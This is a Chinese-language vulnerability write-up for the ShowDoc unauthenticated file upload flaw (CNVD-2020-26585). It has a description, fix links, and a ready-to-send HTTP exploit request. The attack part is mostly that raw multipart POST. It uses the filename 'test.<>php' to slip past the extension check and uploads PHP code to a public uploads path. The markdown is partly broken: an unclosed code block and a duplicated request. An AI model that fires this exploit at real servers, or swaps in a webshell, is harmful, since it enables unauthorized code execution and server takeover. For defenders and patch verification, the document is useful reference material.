# ShowDoc 前台任意文件上传 CNVD-2020-26585

## 漏洞描述
Showdoc 是一个开源的在线共享文档工具。

Showdoc <= 2.8.6 存在 uploadImg 文件上传漏洞，该漏洞源于未正确使用 upload 方法至文件后缀限制失效，攻击者可在未授权的情况下上传任意文件，进而获取服务器权限等。

参考链接：

- https://github.com/star7th/showdoc/pull/1059
- https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
- https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f

## 危害等级
HIGH

## 参考链接
- https://github.com/star7th/showdoc/pull/1059
- https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
- https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f

## 漏洞复现方法
发送如下请求上传一个 PHP 文件：

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0

## Payloads
```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCbwAmmXaS7UssMW
Content-Length: 216


------WebKitFormBoundaryBCbwAmmXaS7UssMW
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?=phpinfo();?>
------WebKitFormBoundaryBCbwAmmXaS7UssMW--
```
```
http://your-ip:8080/Public/Uploads/2024-06-03/665d568d2cdd9.php
```
